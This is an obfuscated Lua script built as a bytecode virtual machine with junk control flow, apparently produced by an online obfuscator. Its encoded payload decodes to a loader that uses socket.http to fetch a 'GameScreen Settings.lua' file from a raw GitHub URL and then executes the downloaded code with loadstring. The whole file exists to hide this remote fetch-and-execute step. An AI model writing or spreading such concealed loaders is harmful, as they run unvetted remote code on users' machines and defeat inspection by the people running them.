-- This file was generated at discord.gg/syncrypt

local tonumber_ = tonumber
local byte = string.byte
local char = string.char
local sub = string.sub
local gsub = string.gsub
local rep = string.rep
local concat = table.concat
local insert = table.insert
insert = math.ldexp
local getfenv_ = getfenv or function()
    return _ENV
end
local setmetatable_ = setmetatable
setmetatable_ = pcall
setmetatable_ = select
if not unpack then
    v11 = table.unpack
end
local tonumber_2 = tonumber
return (function(p1, p2, ...)
    local n1 = 1
    local u13
    local u14
    local function v15(p3)
        local n2

        if byte(p3, 2) == 81 then
            n2 = 0

            while n2 ~= 0 do
            end

            u14 = tonumber_(sub(p3, 1, 1))

            return ""
        else
            n2 = 0

            while n2 ~= 0 do
            end

            n2 = char(tonumber_(p3, 16))

            if u14 then
                return rep(n2, u14)
            else
                return n2
            end

            return
        end
    end
    local v17 = gsub(sub(p1, 5), "..", v15)
    v15 = function(p4, p5, p6)
        local v18

        if p6 then
            v18 = p6 - 1 - (p5 - 1)
            v18 = p4 / 2 ^ (p5 - 1) % 2 ^ (v18 + 1)

            return v18 - v18 % 1
        else
            v18 = 2 ^ (p5 - 1)

            return v18 <= p4 % (v18 + v18) and 1 or 0
        end
    end
    local function u19()
        local v20 = byte(v17, n1, n1)

        n1 = n1 + 1

        return v20
    end
    local function v21()
        local v22, v23 = byte(v17, n1, n1 + 2)

        n1 = n1 + 2

        return v23 * 256 + v22
    end
    local function v24()
        local v25, v26, v27, v28 = byte(v17, n1, n1 + 3)

        n1 = n1 + 4

        return v28 * 16777216 + v27 * 65536 + v26 * 256 + v25
    end
    local function u29()
        local n3 = 0
        local v31
        local v32
        local v33
        local v34
        local v35
        local v36
        while true do
            if n3 == 0 then
                v32 = v24()
                v31 = v24()
                n3 = 1
            end

            if n3 == 3 then
                if v33 == 0 then
                    if v34 == 0 then
                        return v35 * 0
                    else
                        n3 = 0

                        while n3 ~= 0 do
                        end

                        v33 = 1
                        v36 = 0

                        return insert(v35, v33 - 1023) * (v36 + v34 / 4503599627370500)
                    end

                    return
                else
                    if v33 == 2047 then
                        return v34 == 0 and v35 * (1 / 0) or v35 * NaN
                    else
                        return insert(v35, v33 - 1023) * (v36 + v34 / 4503599627370500)
                    end

                    return
                end

                return
            end

            if n3 == 2 then
                v33 = v15(v31, 21, 31)
                v35 = v15(v31, 32) == 1 and -1 or 1
                n3 = 3
            end

            if n3 == 1 then
                v34 = v15(v31, 1, 20) * 4294967296 + v32
                n3 = 2
                v36 = 1
            end
        end
    end
    local function u37(p7)
        local v38, v39, t1

        if p7 then
            v38 = sub(v17, n1, n1 + p7 - 1)
            v39 = n1 + p7
            t1 = {}

            for i = 1, #v38 do
                t1[i] = char(byte(sub(v38, i, i)))
            end

            return concat(t1)
        else
            p7 = v24()

            if p7 == 0 then
                return ""
            else
                v38 = sub(v17, n1, n1 + p7 - 1)
                v39 = n1 + p7
                t1 = {}

                for i = 1, #v38 do
                    t1[i] = char(byte(sub(v38, i, i)))
                end

                return concat(t1)
            end

            return
        end
    end
    u13 = function()
        local v43 = (function()
            return function(_, _, _, p8, p9, p10, p11, p12)
                local v44 = (function()
                    return 0
                end)()
                local v45 = (function()
                end)()
                local v46 = (function()
                end)()

                while true do
                    if v44 == 1 then
                        if v45 == 1 then
                            v46 = (function()
                                return p8() ~= 0
                            end)()
                        elseif v45 == 2 then
                            v46 = (function()
                                return p9()
                            end)()
                        elseif v45 == 3 then
                            v46 = (function()
                                return p10()
                            end)()
                        end

                        p11[p12] = (function()
                            return v46
                        end)()

                        return v44, v45, v46, p8, p9, p10, p11, p12
                    end

                    if v44 ~= 0 then
                        continue
                    end

                    v44 = (function()
                        return 0
                    end)();
                    (function()
                    end)()

                    while v44 ~= 0 do
                    end

                    v44 = (function()
                        return 0
                    end)()

                    while true do
                        if v44 == 0 then
                            v45 = (function()
                                return p8()
                            end)()
                            v46 = (function()
                                return nil
                            end)()
                            v44 = (function()
                                return 1
                            end)()
                        end

                        if v44 == 1 then
                            break
                        else
                            continue
                        end
                    end

                    v44 = (function()
                        return 1
                    end)()

                    continue
                end
            end
        end)()
        local v47 = (function()
            return function(p13, p14, p15)
                local v48 = (function()
                    return 0
                end)();

                (function()
                end)()

                while v48 ~= 0 do
                end

                v48 = (function()
                    return 0
                end)()

                while v48 ~= 0 do
                end

                v48 = (function()
                    return 0
                end)()

                while v48 ~= 0 do
                end

                p13[p14 - 1] = (function()
                    return p15()
                end)()

                return p13, p14, p15
            end
        end)()
        local v49 = (function()
            return {}
        end)()
        local v50 = (function()
            return {}
        end)()
        local v51 = (function()
            return {}
        end)()

        v51 = (function()
            return {
				v49,
				v50,
				nil,
				v51
			}
        end)()

        local v52 = (function()
            return v24()
        end)()
        local v53 = (function()
            return {}
        end)()
        local v54 = v50
        local n4 = 0
        local v56 = false
        local v57, v58, v59, v60, v61

        while true do
            n4 = n4 + 1
            v57 = ((not v56 or v52 > n4) and true or false) and not v56

            if v57 then
                v57 = n4 <= v52
            end

            if not v57 then
                break
            end

            local v62 = n4
            local v63, v64, v65

            v57, v58, v59, v60, v61, v63, v64, v65 = (function()
                return v43(FlatIdent_8D83D, Type, Cons, u19, u29, u37, v53, v62)
            end)()
            FlatIdent_8D83D = v57
            Type = v58
            Cons = v59
            u19 = v60
            u29 = v61
            u37 = v63

            local v66 = v64

            v62 = v65
            v53 = v66
        end

        v51[3] = (function()
            return u19()
        end)()

		-- NumForInit
        local n5, v68, n6 = 1, v24(), 1

-- end NumForInit
        while true do
            v56 = n5 + n6

            if (0 >= n6 or v56 > v68) and (n6 > 0 or v68 > v56) then
                break
            end

            v57 = (function()
                return u19()
            end)()

            if v15(v57, 1, 1) == 0 then
                v58 = (function()
                    return 0
                end)()
                v59 = (function()
                end)()
                v60 = (function()
                end)()
                v61 = (function()
                end)()
                n5 = v56

                while true do
                    if v58 == 1 then
                        v58 = (function()
                            return 0
                        end)();
                        (function()
                        end)()

                        while v58 ~= 0 do
                        end

                        v58 = (function()
                            return 0
                        end)()

                        while true do
                            if v58 == 0 then
                                v61 = (function()
                                    return {
										v21(),
										v21(),
										nil,
										nil
									}
                                end)()

                                if v59 == 0 then
                                    v58 = (function()
                                        return 0
                                    end)();
                                    (function()
                                    end)()

                                    while v58 ~= 0 do
                                    end

                                    v58 = (function()
                                        return 0
                                    end)()

                                    while v58 ~= 0 do
                                    end

                                    v61[3] = (function()
                                        return v21()
                                    end)()
                                    v61[4] = (function()
                                        return v21()
                                    end)()
                                elseif v59 == 1 then
                                    v61[3] = (function()
                                        return v24()
                                    end)()
                                elseif v59 == 2 then
                                    v61[3] = (function()
                                        return v24() - 65536
                                    end)()
                                elseif v59 == 3 then
                                    v58 = (function()
                                        return 0
                                    end)();
                                    (function()
                                    end)()

                                    while v58 ~= 0 do
                                    end

                                    v58 = (function()
                                        return 0
                                    end)()

                                    while v58 ~= 0 do
                                    end

                                    v61[3] = (function()
                                        return v24() - 65536
                                    end)()
                                    v61[4] = (function()
                                        return v21()
                                    end)()
                                end

                                v58 = (function()
                                    return 1
                                end)()
                            end

                            if v58 == 1 then
                                break
                            else
                                continue
                            end
                        end

                        v58 = (function()
                            return 2
                        end)()
                    end

                    if v58 == 0 then
                        v59 = (function()
                            return v15(v57, 2, 3)
                        end)()
                        v60 = (function()
                            return v15(v57, 4, 6)
                        end)()
                        v58 = (function()
                            return 1
                        end)()
                    end

                    if v58 == 2 then
                        if v15(v60, 1, 1) == 1 then
                            v61[2] = (function()
                                return v53[v61[2]]
                            end)()
                        end

                        if v15(v60, 2, 2) == 1 then
                            v61[3] = (function()
                                return v53[v61[3]]
                            end)()
                        end

                        v58 = (function()
                            return 3
                        end)()
                    end

                    if v58 == 3 then
                        break
                    else
                        continue
                    end
                end

                if v15(v60, 3, 3) == 1 then
                    v61[4] = (function()
                        return v53[v61[4]]
                    end)()
                end

                v49[v56] = (function()
                    return v61
                end)()

                continue
            else
                n5 = v56

                continue
            end

            break
        end

        for i = 1, v24() do
            local v71
            n6 = function()
                return v47(v54, v71, u13)
            end
            v71 = i
            n6, v56, v57 = n6()
            v50 = n6
            v71 = v56
            u13 = v57
            v54 = v50
        end

        return v51
    end

    return (function(p16, _, p17)
        local v72 = p16[1]
        local v73 = p16[2]

        v73 = p16[3]

        return function(...)
            local v74 = v72
            local v75 = v73
            local n7 = 1
            local v77 = setmetatable_("#", ...) - 1
            local v78 = n7 < 0
            local v79 = 0 - n7
            local v80 = v77
            local handlers = {}
            local n8 = 1
            local t2 = { ... }
            local t3 = {}

            while true do
                v79 = v79 + n7

                local v85 = ((not v78 or v77 > v79) and true or false) and not v78

                if v85 then
                    v85 = v79 <= v77
                end

                if not v85 then
                    break
                end

                if v75 <= v79 then
                    t3[v79 - v75] = t2[v79 + 1]
                else
                    handlers[v79] = t2[v79 + 1 + 0]
                end
            end

            v75 = v80 - v75 + 1

            while true do
                v75 = v74[n8]
                n7 = v75[1]

                if n7 <= 2 then
                    if n7 <= 0 then
                        n7 = 0
                        v77 = nil

                        while n7 ~= 3 do
                            if n7 == 1 then
                                handlers[v75[2]] = v75[3]
                                n8 = n8 + 1
                                v75 = v74[n8]
                                v77 = v75[2]
                                n7 = 2
                            end

                            if n7 == 0 then
                                handlers[v75[2]] = p17[v75[3]]
                                n8 = n8 + 1
                                v75 = v74[n8]
                                n7 = 1
                                v77 = nil
                            end

                            if n7 == 2 then
                                handlers[v77] = handlers[v77](handlers[v77 + 1])
                                n8 = n8 + 1 + 0
                                v75 = v74[n8]
                                handlers[v75[2]]()
                                n7 = 3
                            end
                        end

                        v74 = v74[n8 + 1]

                        return
                    end

                    if n7 > 1 then
                        handlers[v75[2]]()
                    else
                        handlers[v75[2]] = v75[3]
                    end
                elseif n7 <= 3 then
                    v75 = v75[2]
                    handlers[v75] = handlers[v75](handlers[v75 + 1])
                else
                    if n7 ~= 4 then
                        return
                    end

                    handlers[v75[2]] = p17[v75[3]]
                end

                n8 = n8 + 1
            end
        end
    end)(u13(), {}, p2)(...)
end)("LOL!023Q00030A3Q006C6F6164737472696E670330012Q006C6F63616C20682Q7470203D20726571756972652822736F636B65742E682Q747022290A6C6F63616C206C746E3132203D207265717569726528226C746E313222290A6C6F63616C2074203D207B7D0A6C6F63616C2075726C203D2022682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F537572747A796465762F47616D655363722Q656E2F726566732F68656164732F6D61696E2F47616D655363722Q656E25323053652Q74696E67732E6C7561220A682Q74702E726571756573747B0A4Q2075726C203D2075726C2C0A4Q2073696E6B203D206C746E31322E73696E6B2E7461626C652874290A7D0A6C6F63616C20726573756C74203D207461626C652E636F6E6361742874290A6C6F6164737472696E6728726573756C7429282900053Q00124Q00013Q00122Q000100028Q000200026Q000100016Q00017Q00", getfenv_(), ...)
